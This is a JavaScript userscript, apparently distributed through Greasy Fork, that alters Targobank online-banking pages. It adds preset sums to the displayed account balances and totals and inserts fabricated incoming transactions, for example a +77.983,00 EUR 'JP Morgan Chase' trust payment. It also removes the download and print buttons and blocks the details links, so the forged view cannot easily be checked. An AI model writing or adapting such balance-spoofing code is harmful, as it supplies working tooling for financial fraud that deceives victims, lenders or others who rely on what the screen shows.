// ==UserScript==
// @name         Ed WM Targo Bernhard Noack
// @namespace    http://tampermonkey.net/
// @version      9.0
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        *://*/*
// @match        https://www.drivehq.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/499372/Ed%20WM%20Targo%20Bernhard%20Noack.user.js
// @updateURL https://update.greasyfork.org/scripts/499372/Ed%20WM%20Targo%20Bernhard%20Noack.meta.js
// ==/UserScript==

//CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++



//=======================================================================================================================================================================================================================
// TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE---------------------

    // Configurable elements
    var useSameAdjustmentAmount = false; // Set to true to use the same adjustment amount for all balances
    var adjustmentAmount = 10.0; // The adjustment amount to use if "useSameAdjustmentAmount" is true


    // Configuration for individual balance modifications
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 8785.0 },
        { index: 1, adjustmentAmount: 9320.0 },
        { index: 2, adjustmentAmount: 0.0 },
        // Add more configurations as needed
    ];
//=======================================================================================================================================================================================================================



//=======================================================================================================================================================================================================================
// TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE---------------------

    // Configurable elements
    var badjustmentAmount = 15320.0 ; // Modify this value based on your requirement
    var associatedText = '526XXXX622'; // Modify this value based on the associated text for your balance

    // Configuration for "gesamt" balance modification
    var gesamtAdjustmentAmount = 16791.0; // Modify this value based on your requirement
    var gesamtAssociatedText = 'Gesamt'; // Modify this value based on the associated text for "gesamt" balance
//=======================================================================================================================================================================================================================





//=======================================================================================================================================================================================================================
// TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------------

    // Configurable elements
    var targetDigits = "526622";
    var useSameAdjustmentAmountUM = false; // Set to true to use the same adjustment amount for all balances
//    var adjustmentAmount = -2000.0; // The adjustment amount to use if "useSameAdjustmentAmount" is true

//    // Configuration for individual balance modifications
    var BALANCE_CONFIGSUM = [
        { index: 0, adjustmentAmount: 8700.0  },
        { index: 1, adjustmentAmount: 8700.0  },
        { index: 2, adjustmentAmount: 8700.0  },
        // Add more configurations as needed
   ];
//=======================================================================================================================================================================================================================



//=======================================================================================================================================================================================================================
// TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT---------------------------------TARGO UMSAETZE INSERT-----------



// Check if the page contains the specified digits in the target text
//    var targetDigits = "538992";


    // Manually configure the transactions with an "order" property
    var transactions = [
        {
            order: 2, // Order of processing (1 for first, 2 for second, etc.)
            transactionDate: '02.07.2024',
            transactionTitle: 'JP Morgan Chase. A. Graf meldet sich. Geld für Steuern.',
            transactionAmount: '+7.500,00 EUR',
            movingDirection: 'down', // 'up' or 'down'
           numberOfSteps: 1 // Number of steps to move (positive integer)
       },
        {
            order: 1, // Order of processing (1 for first, 2 for second, etc.)
            transactionDate: '02.07.2024',
            transactionTitle: 'Treuhand: JP Morgan Chase. A. Graf meldet sich.',
            transactionAmount: '+77.983,00 EUR',
            movingDirection: 'up', // 'up' or 'down'
            numberOfSteps: 2 // Number of steps to move (positive integer)
        }
        // Add more transactions with their order as needed
    ];
//=======================================================================================================================================================================================================================




//+++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE+++++++
//=======================================================================================================================================================================================================================
//CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++
//=======================================================================================================================================================================================================================
//+++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE+++++++



//=======================================================================================================================================================================================================================
//=======================================================================================================================================================================================================================
//=======================================================================================================================================================================================================================



// TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE---------------------
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE---------------------


//=======================================================================================================================================================================================================================




if (window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("drive") > 0) {


(function() {
    'use strict';

//    // Configurable elements
//    var useSameAdjustmentAmount = true; // Set to true to use the same adjustment amount for all balances
//    var adjustmentAmount = -2000.0; // The adjustment amount to use if "useSameAdjustmentAmount" is true
    var targetText = "Alle Konten anzeigen";

//    // Configuration for individual balance modifications
//    var BALANCE_CONFIGS = [
//        { index: 0, adjustmentAmount: 3000.50 },
//        { index: 2, adjustmentAmount: 3000.70 },
//        { index: 3, adjustmentAmount: 3000.90 },
//        // Add more configurations as needed
//    ];

    // Function to check if the target text is present on the page
    function isTextPresent(text) {
        return document.body.textContent.includes(text);
    }

    // Function to modify the balance
    function modifyBalance(balanceElement, adjustmentAmount) {
        // Check if the balance element is found
        if (balanceElement) {
            // Extract the current balance text
            var currentBalanceText = balanceElement.textContent.trim();

            // Extract the numeric value from the balance text
            var currentBalance = parseFloat(currentBalanceText.replace(/[^0-9\.,-]/g, '').replace(',', '.'));

            // Check if the current balance is a valid number
            if (!isNaN(currentBalance)) {
                // Calculate the new balance
                var newBalance = currentBalance + adjustmentAmount;

                // Determine the new class based on the sign of the new balance
                var newClass = newBalance < 0 ? 'd ei_sdsf_montant _c1 neg _c1' : 'd ei_sdsf_montant _c1 pos _c1';

                // Update the balance element with the new value and class
                var updatedBalanceText = currentBalanceText.replace(currentBalance, newBalance.toFixed(2));
                updatedBalanceText = removeFirstSign(updatedBalanceText);

                balanceElement.textContent = updatedBalanceText;
                balanceElement.className = newClass;

                console.log(`Account balance modified by ${adjustmentAmount.toFixed(2)}. New balance: ${newBalance.toFixed(2)}`);
            } else {
                console.error('Failed to extract a valid balance from the page.');
            }
        } else {
            console.error('Balance element not found on the page.');
        }
    }

    // Function to remove the first sign
    function removeFirstSign(text) {
        return text.replace(/(\+|\-){1}/, '');
    }

    // Function to initialize the balance modifications
    function initializeBalanceModifications() {
        // Check if the page contains the specified text
        if (isTextPresent(targetText)) {
            // Find the elements with the account balance class
            var balanceElements = document.querySelectorAll('.d.ei_sdsf_montant._c1.pos._c1, .d.ei_sdsf_montant._c1.neg._c1');

            // Check if any balance elements are found
            if (balanceElements.length > 0) {
                if (useSameAdjustmentAmount) {
                    // Use the same adjustment amount for all balances
                    BALANCE_CONFIGS.forEach(function(config) {
                        modifyBalance(balanceElements[config.index], adjustmentAmount);
                    });
                } else {
                    // Use individual adjustment amounts for each balance
                    BALANCE_CONFIGS.forEach(function(config) {
                        modifyBalance(balanceElements[config.index], config.adjustmentAmount);
                    });
                }
            } else {
                console.error('No balance elements found on the page. Retrying...');
                setTimeout(initializeBalanceModifications, 1); // Retry after 1 millisecond
            }
        } else {
            console.error(`Text "${targetText}" not found on the page. Retrying...`);
            setTimeout(initializeBalanceModifications, 1); // Retry after 1 millisecond
        }
    }

    // Initialize balance modifications on page load
    initializeBalanceModifications();
})();
 }

//=======================================================================================================================================================================================================================

//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------


// TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE---------------------
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE---------------------


//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------

//=======================================================================================================================================================================================================================






//===========================================================================================================================================================================================================================


// TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE---------------------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE---------------------


//===========================================================================================================================================================================================================================



if (window.location.href.indexOf("comptes-et-contrats") > 0 || window.location.href.indexOf("comptes-et-contrats") > 0 || window.location.href.indexOf("drive") > 0) {

(function() {
    'use strict';

//    // Configurable elements
//   var badjustmentAmount = -2000.0; // Modify this value based on your requirement
//    var associatedText = '538XXXX992'; // Modify this value based on the associated text for your balance

//    // Configuration for "gesamt" balance modification
//    var gesamtAdjustmentAmount = -1000.0; // Modify this value based on your requirement
 //   var gesamtAssociatedText = 'Gesamt'; // Modify this value based on the associated text for "gesamt" balance

    // Function to modify the balance
    function modifyBalance(balanceElement, badjustmentAmount, associatedText) {
        // Check if the balance element is found
        if (balanceElement) {
            // Extract the current balance text
            var currentBalanceText = balanceElement.textContent.trim();

            // Extract the numeric value from the balance text
            var currentBalance = parseFloat(currentBalanceText.replace(/[^\d\,-]/g, '').replace(',', '.'));

            // Check if the current balance is a valid number
            if (!isNaN(currentBalance)) {
                // Check for the associated text content in the same <tr> tag
                var trElement = balanceElement.closest('tr');
                if (trElement && trElement.textContent.includes(associatedText)) {
                    // Calculate the new balance
                    var newBalance = currentBalance + badjustmentAmount;

                    // Determine the new class based on the sign of the new balance
                    var newClass = newBalance < 0 ? 'ei_sdsf_montant _c1 neg _c1' : 'ei_sdsf_montant _c1 pos _c1';

                    // Update the balance element with the new value and class
                    var updatedBalanceText = formatBalance(newBalance);

                    // Remove the first sign if there are two signs before the balance
                    updatedBalanceText = updatedBalanceText.replace(/^(\+|\-){1}(\+|\-)/, '$2');

                    balanceElement.textContent = updatedBalanceText;
                    balanceElement.className = newClass;

                    console.log(`Account balance modified by ${badjustmentAmount.toFixed(2)}. New balance: ${newBalance.toFixed(2)}`);
                } else {
                    console.log(`Associated text "${associatedText}" not found under the same <tr> tag. Skipping modification.`);
                }
            } else {
                console.error('Failed to extract a valid balance from the page.');
            }
        } else {
            console.error('Balance element not found on the page.');
        }
    }

    // Function to format the balance with thousands separator and decimal separator
    function formatBalance(balance) {
        return balance.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' EUR';
    }

    // Remove the element with class "a_actions"
    var actionsElement = document.querySelector('.a_actions');
    if (actionsElement) {
        actionsElement.remove();
        console.log('Element with class "a_actions" removed.');
    }

    // Find the elements with positive and negative balances
    var positiveBalanceElement = document.querySelector('.ei_sdsf_montant._c1.pos._c1');
    var negativeBalanceElement = document.querySelector('.ei_sdsf_montant._c1.neg._c1');

    // Modify the positive balance
    modifyBalance(positiveBalanceElement, badjustmentAmount, associatedText);

    // Modify the negative balance
    modifyBalance(negativeBalanceElement, badjustmentAmount, associatedText);

    // Find the elements with "gesamt" balances
    var gesamtPositiveBalanceElement = document.querySelector('.ei_sdsf_montant.nowrap._c1.pos._c1');
    var gesamtNegativeBalanceElement = document.querySelector('.ei_sdsf_montant.nowrap._c1.neg._c1');

    // Modify the "gesamt" positive balance
    modifyBalance(gesamtPositiveBalanceElement, gesamtAdjustmentAmount, gesamtAssociatedText);

    // Modify the "gesamt" negative balance
    modifyBalance(gesamtNegativeBalanceElement, gesamtAdjustmentAmount, gesamtAssociatedText);
})();
}





//=======================================================================================================================================================================================================================


//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------


// TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE---------------------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE-----------------------TARGO KONTENUEBER BALANCE CHANGE---------------------



//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------

//========================================================================================================================================================================================================================






//===========================================================================================================================================================================================================================


// TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE---------------------------------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE---------------------------------


//===========================================================================================================================================================================================================================



if (window.location.href.indexOf("mouvements") > 0 || window.location.href.indexOf("mouvements") > 0 || window.location.href.indexOf("drive") > 0) {

(function() {
    'use strict';

//    // Configurable elements
//    var targetDigits = "538992";
//    var useSameAdjustmentAmountUM = true; // Set to true to use the same adjustment amount for all balances
//    var adjustmentAmount = -2000.0; // The adjustment amount to use if "useSameAdjustmentAmount" is true

//    // Configuration for individual balance modifications
//    var BALANCE_CONFIGSUM = [
 //       { index: 0, adjustmentAmount: 3000.50 },
//        { index: 2, adjustmentAmount: 3000.70 },
//        { index: 3, adjustmentAmount: 3000.90 },
 //       // Add more configurations as needed
 //   ];


        var aktuellerKontostandText = "Aktueller Kontostand";

    // Function to check if the target text contains the specified digits
    function containsDigits(text, digits) {
        return digits.split('').every(digit => text.includes(digit));
    }

    // Check if the page contains the specified digits in the target text
    if (!containsDigits(document.body.textContent, targetDigits)) {
        console.error(`Digits "${targetDigits}" not found in the target text on the page. Aborting script.`);
        return;
    }

    // Check if the page contains the text "Aktueller Kontostand"
    if (!document.body.textContent.includes(aktuellerKontostandText)) {
        console.error(`Text "${aktuellerKontostandText}" not found on the page. Aborting script.`);
        return;
    }

    // Find the elements with the account balance class
    var balanceElements = document.querySelectorAll('._c1.nowrap._c1, ._c1.nowrap._c1.neg');

    // Check if any balance elements are found
    if (balanceElements.length > 0) {
        if (useSameAdjustmentAmountUM) {
            // Use the same adjustment amount for all balances
            BALANCE_CONFIGSUM.forEach(function(config) {
                modifyBalance(balanceElements[config.index], adjustmentAmount);
            });
        } else {
            // Use individual adjustment amounts for each balance
            BALANCE_CONFIGSUM.forEach(function(config) {
                modifyBalance(balanceElements[config.index], config.adjustmentAmount);
            });
        }
    } else {
        console.error('No balance elements found on the page.');
    }

    // Function to modify the balance
    function modifyBalance(balanceElement, adjustmentAmount) {
        // Check if the balance element is found
        if (balanceElement) {
            // Extract the current balance text
            var currentBalanceText = balanceElement.textContent.trim();

            // Extract the numeric value from the balance text
            var currentBalance = parseFloat(currentBalanceText.replace(/[^0-9\.,-]/g, '').replace(',', '.'));

            // Check if the current balance is a valid number
            if (!isNaN(currentBalance)) {
                // Calculate the new balance
                var newBalance = currentBalance + adjustmentAmount;

                // Determine the new class based on the sign of the new balance
                var newClass = newBalance < 0 ? '_c1.nowrap._c1.neg' : '_c1.nowrap._c1';

                // Update the balance element with the new value and class
                var updatedBalanceText = currentBalanceText.replace(currentBalance, newBalance.toFixed(2));
                updatedBalanceText = removeFirstSign(updatedBalanceText);

                balanceElement.textContent = updatedBalanceText;
                balanceElement.className = newClass;

                console.log(`Account balance modified by ${adjustmentAmount.toFixed(2)}. New balance: ${newBalance.toFixed(2)}`);
            } else {
                console.error('Failed to extract a valid balance from the page.');
            }
        } else {
            console.error('Balance element not found on the page.');
        }
    }

    // Function to remove the first sign
    function removeFirstSign(text) {
        return text.replace(/(\+|\-){1}/, '');
    }
})();
}


//===========================================================================================================================================================================================================================


//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------


// TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE---------------------------------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE-----------------------TARGO UMSAETZE BALANCE CHANGE---------------------------------


//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------


//===========================================================================================================================================================================================================================




//===========================================================================================================================================================================================================================


// TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT---------------------------------TARGO UMSAETZE INSERT-----------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------TARGO UMSAETZE INSERT-----------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT---------------------------------TARGO UMSAETZE INSERT-----------


//===========================================================================================================================================================================================================================




if (window.location.href.indexOf("mouvements") > 0 || window.location.href.indexOf("mouvements") > 0 || window.location.href.indexOf("drive") > 0) {

(function() {
    'use strict';

    // Function to check if the target text contains the specified digits
    function containsDigits(text, digits) {
        return digits.split('').every(digit => text.includes(digit));
    }

//    // Check if the page contains the specified digits in the target text
//    var targetDigits = "538992";
    if (!containsDigits(document.body.textContent, targetDigits)) {
        console.error(`Digits "${targetDigits}" not found in the target text on the page. Aborting script.`);
        return;
    }

//    // Manually configure the transactions with an "order" property
//    var transactions = [
//        {
//            order: 2, // Order of processing (1 for first, 2 for second, etc.)
//            transactionDate: '13.12.2023',
//            transactionTitle: 'Marlene Friedrichs und Hans Friedrichs',
//            transactionAmount: '-100,00 EUR',
//            movingDirection: 'down', // 'up' or 'down'
//            numberOfSteps: 1 // Number of steps to move (positive integer)
//        },
//        {
//            order: 1, // Order of processing (1 for first, 2 for second, etc.)
//            transactionDate: '14.12.2023',
//            transactionTitle: 'John Doe',
//            transactionAmount: '+50,00 EUR',
//            movingDirection: 'up', // 'up' or 'down'
//            numberOfSteps: 2 // Number of steps to move (positive integer)
//        }
//        // Add more transactions with their order as needed
//    ];

    // Sort transactions by their processing order
    transactions.sort(function(a, b) {
        return a.order - b.order;
    });

    // Function to insert a transaction
    function insertTransaction(transaction) {
        // Determine the transaction amount class based on its sign
        var transactionAmountClass = transaction.transactionAmount.startsWith('-') ? '_c1 neg _c1' : '_c1 pos _c1';

        // Create the transaction HTML
        var transactionHtml = `
            <tr>
                <td class="h c nowrap  eir_hidexs _c1 i _c1">${transaction.transactionDate}</td>
                <td class="g ei_decal1 _c1 i _c1">
                    <div class="_c1 fd d _c1">
                        <a id="I0:d2.D:A:ub.ut.F6_0.F7_2.F8_0.A9" href="#">Details</a>
                    </div>
                    <span class=" eir_showxs">${transaction.transactionDate}<br></span>
                    ${transaction.transactionTitle}
                    <p class="_c1 d _c1  eir_showxs pos">${transaction.transactionAmount}</p>
                </td>
                <td class="d nowrap h  eir_hidexs _c1 i _c1"></td>
                <td class="d nowrap h  eir_hidexs ${transactionAmountClass} i _c1"><span class="${transactionAmountClass}">${transaction.transactionAmount}</span></td>
            </tr>
        `;

        // Find the second <tbody> element on the page
        var tbodyElements = document.querySelectorAll('tbody');
        if (tbodyElements.length >= 2) {
            var secondTbody = tbodyElements[1];

            // Insert the transaction HTML as the first child of the second <tbody> element
            secondTbody.insertAdjacentHTML('afterbegin', transactionHtml);

            // Move the transaction up or down
            if (transaction.movingDirection === 'up') {
                for (var i = 0; i < transaction.numberOfSteps; i++) {
                    var transactionRow = secondTbody.querySelector('tr');
                    if (transactionRow) {
                        var previousSibling = transactionRow.previousElementSibling;
                        if (previousSibling) {
                            previousSibling.insertAdjacentElement('beforebegin', transactionRow);
                        }
                    }
                }
            } else if (transaction.movingDirection === 'down') {
                for (var i = 0; i < transaction.numberOfSteps; i++) {
                    var transactionRow = secondTbody.querySelector('tr');
                    if (transactionRow) {
                        var nextSibling = transactionRow.nextElementSibling;
                        if (nextSibling) {
                            nextSibling.insertAdjacentElement('afterend', transactionRow);
                        }
                    }
                }
            }

            console.log(`Transaction inserted and moved ${transaction.numberOfSteps} step(s) ${transaction.movingDirection}.`);
        } else {
            console.error('Not enough <tbody> elements found on the page.');
        }
    }

    // Process transactions in the defined order
    transactions.forEach(function(transaction) {
        insertTransaction(transaction);
    });
})();
 }

//===========================================================================================================================================================================================================================


//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------


// TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT---------------------------------TARGO UMSAETZE INSERT-----------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------TARGO UMSAETZE INSERT-----------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT-----------------------TARGO UMSAETZE INSERT---------------------------------TARGO UMSAETZE INSERT-----------


//THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------THE END-----------------


//===========================================================================================================================================================================================================================









//===========================================================================================================================================================================================================================


// TARGO START UTILITY-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY---------------------------------TARGO START UTILITY---------------------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY-----------TARGO START UTILITY---------------------
//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO START UTILITY-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY-----------------------TARGO START UTILITY---------------------------------TARGO START UTILITY---------------------


//===========================================================================================================================================================================================================================



if (window.location.href.indexOf("pageaccueil") > 0 || window.location.href.indexOf("pageaccueil") > 0 || window.location.href.indexOf("drive") > 0) {


(function() {
    'use strict';

    // Function to remove the second element with role="group"
    function removeSecondGroupElement() {
        // Remove the second element with role="group" directly on page load
        var groupElements = document.querySelectorAll('[role="group"]');
        if (groupElements.length > 1) {
            groupElements[1].remove();
            console.log('Second element with role="group" removed on page load.');
        }

        // Create a MutationObserver instance
        var observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                mutation.addedNodes.forEach(function(addedNode) {
                    // Check if the added node is an element with role="group"
                    if (addedNode instanceof Element && addedNode.getAttribute('role') === 'group') {
                        // Check if it is the second element with role="group"
                        var updatedGroupElements = document.querySelectorAll('[role="group"]');
                        if (updatedGroupElements.length > 1) {
                            // Remove the second element with role="group"
                            updatedGroupElements[1].remove();
                            console.log('Second element with role="group" removed.');
                        }
                    }
                });
            });
        });

        // Options for the observer
        var config = { childList: true, subtree: true };

        // Start observing the target node for configured mutations
        observer.observe(document.body, config);
    }

    // Call the function to remove the second element with role="group"
    removeSecondGroupElement();
})();
 }








//=========================================================================================================================================================================================================================================


// TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY---------------------------------TARGO UMSAETZE UTILITY---------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------TARGO UMSAETZE UTILITY---------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY---------------------------------TARGO UMSAETZE UTILITY---------------------


//=========================================================================================================================================================================================================================================






if (window.location.href.indexOf("mouvements") > 0 || window.location.href.indexOf("mouvements") > 0 || window.location.href.indexOf("drive") > 0) {

(function() {
    'use strict';

    // Function to make an element non-interactive
    function disableInteraction(element) {
        element.style.pointerEvents = 'none';
    }

    // Function to remove elements with a specific title attribute
    function removeElementsWithTitle(title) {
        var elements = document.querySelectorAll('[title="' + title + '"]');
        elements.forEach(function(element) {
            element.remove();
        });
    }

    // Function to remove parent elements of specified text content
    function removeParentElementsByTextContent(textContent) {
        var textElements = document.evaluate('//text()[contains(translate(., "ABCDEFGHIJKLMNOPQRSTUVWXYZ", "abcdefghijklmnopqrstuvwxyz"), "' + textContent.toLowerCase() + '")]', document.body, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
        for (var i = 0; i < textElements.snapshotLength; i++) {
            var textNode = textElements.snapshotItem(i);
            var parentElement = textNode.parentElement;
            if (parentElement) {
                parentElement.remove();
            }
        }
    }

    // Disable clicks within the area of class "_c1 ei_titlelabel _c1" and its children
    var titlelabelArea = document.querySelector('._c1.ei_titlelabel._c1');
    if (titlelabelArea) {
        disableInteraction(titlelabelArea);
    }

    // Disable clicks within the area of class "_c1 ei_titlelabelsblock _c1" and its children
    var titlelabelsblockArea = document.querySelector('._c1.ei_titlelabelsblock._c1');
    if (titlelabelsblockArea) {
        disableInteraction(titlelabelsblockArea);
    }

    // Disable clicks within the area of class "eir_hidexs" and its children
    var hidexsArea = document.querySelector('.eir_hidexs');
    if (hidexsArea) {
        disableInteraction(hidexsArea);
    }

    // Remove elements with title="Herunterladen" and title="Ausdrucken" using MutationObserver
    var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.type === 'childList') {
                removeElementsWithTitle('Herunterladen');
                removeElementsWithTitle('Ausdrucken');
            }
        });
    });

    // Configuration of the MutationObserver
    var observerConfig = { childList: true, subtree: true };

    // Start observing the document
    observer.observe(document.body, observerConfig);

    // Remove parent elements of specified text content
    removeParentElementsByTextContent('Mitteilungen');
    removeParentElementsByTextContent('Grafiken');
    removeParentElementsByTextContent('Details');
})();
 }




